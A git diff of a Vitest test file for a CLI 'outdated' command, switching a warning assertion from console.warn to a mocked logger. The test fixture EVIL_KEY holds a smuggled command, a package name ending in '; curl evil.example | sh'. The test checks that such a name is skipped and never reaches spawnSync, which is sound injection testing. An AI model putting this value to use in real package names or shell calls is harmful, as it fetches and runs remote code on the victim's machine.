@@ -3,8 +3,11 @@ import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
-const mocks = vi.hoisted(() => ({ spawnSync: vi.fn() }));
+const mocks = vi.hoisted(() => ({ spawnSync: vi.fn(), logWarn: vi.fn() }));
 vi.mock("node:child_process", () => ({ spawnSync: mocks.spawnSync }));
+vi.mock("../../src/logger.js", () => ({
+  logger: { warn: mocks.logWarn, error: vi.fn(), info: vi.fn() },
+}));
 vi.mock("ora", () => {
   const spinner = { start: (): unknown => spinner, stop: (): unknown => spinner };
   return { default: () => spinner };
@@ -17,7 +20,6 @@ const EVIL_KEY = "@tuttiai/x; curl evil.example | sh";
 describe("outdatedCommand", () => {
   let dir: string;
   let log: ReturnType<typeof vi.spyOn>;
-  let warn: ReturnType<typeof vi.spyOn>;
 
   function writeDeps(dependencies: Record<string, string>): void {
     writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies }));
@@ -34,9 +36,9 @@ describe("outdatedCommand", () => {
       throw new Error(`exit ${String(code)}`);
     });
     log = vi.spyOn(console, "log").mockImplementation(() => undefined);
-    warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
     vi.spyOn(console, "error").mockImplementation(() => undefined);
     mocks.spawnSync.mockReset();
+    mocks.logWarn.mockReset();
     mocks.spawnSync.mockReturnValue({ status: 0, stdout: "1.2.0\n" });
   });
 
@@ -64,7 +66,7 @@ describe("outdatedCommand", () => {
 
     expect(mocks.spawnSync).toHaveBeenCalledTimes(1);
     expect(JSON.stringify(mocks.spawnSync.mock.calls)).not.toContain("curl");
-    expect(warn).toHaveBeenCalledWith(expect.stringContaining(`Skipping ${JSON.stringify(EVIL_KEY)}`));
+    expect(mocks.logWarn).toHaveBeenCalledWith(`Skipping ${JSON.stringify(EVIL_KEY)}: not a valid npm package name.`);
     expect(output()).toContain("All packages are up to date.");
   });
 
